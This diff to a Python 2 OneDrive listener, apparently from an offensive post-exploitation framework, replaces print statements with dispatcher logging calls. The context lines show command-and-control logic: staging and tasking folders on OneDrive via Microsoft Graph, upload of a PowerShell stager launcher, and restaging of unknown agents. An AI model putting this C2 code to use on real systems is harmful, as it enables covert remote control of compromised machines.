@@ -533,7 +533,7 @@ class Listener:
                 params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': base_folder}
                 base_object = s.post("%s/drive/items/root/children" % base_url, json=params)
             else:
-                print helpers.color("[*] %s folder already exists" % base_folder)
+                dispatcher.send("[*] %s folder already exists" % base_folder, sender="listeners/onedrive")
 
             for item in [staging_folder, taskings_folder, results_folder]:
                 item_object = s.get("%s/drive/root:/%s/%s" % (base_url, base_folder, item))
@@ -542,7 +542,7 @@ class Listener:
                     params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': item}
                     item_object = s.post("%s/drive/items/%s/children" % (base_url, base_object.json()['id']), json=params)
                 else:
-                    print helpers.color("[*] %s/%s already exists" % (base_folder, item))
+                    dispatcher.send("[*] %s/%s already exists" % (base_folder, item), sender="listeners/onedrive")
 
         def upload_launcher():
             ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
@@ -572,7 +572,7 @@ class Listener:
 
             else:
                 print helpers.color("[!] Something went wrong uploading stager")
-                print r.json()
+                dispatcher.send(r.content, sender="listeners/onedrive")
 
         listener_options = copy.deepcopy(listenerOptions)
 
@@ -659,7 +659,8 @@ class Listener:
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
                     except Exception, e:
-                        print(traceback.format_exc())
+                        print helpers.color("[!] Could not handle agent staging for listener %s, continuing" % listener_name)
+                        dispatcher.send(traceback.format_exc(), sender="listeners/onedrive")
 
                 agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
                 for agent_id in agent_ids: #Upload any tasks for the current agents
@@ -682,7 +683,7 @@ class Listener:
                     try:
                         agent_id = item['name'].split(".")[0]
                         if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
-                            dispatcher.send("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name']), sender="listeners/onedrive")
+                            print helpers.color("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name']))
                             s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
                             continue
@@ -705,7 +706,8 @@ class Listener:
                         dispatcher.send("[!] Error handling agent results for %s, %s" % (item['name'], e), sender="listeners/onedrive")
 
             except Exception, e:
-                print(traceback.format_exc())
+                print helpers.color("[!] Something happened in listener %s: %s, continuing" % (listener_name, e))
+                dispatcher.send(traceback.format_exc(), sender="listeners/onedrive")
 
             s.close()
 
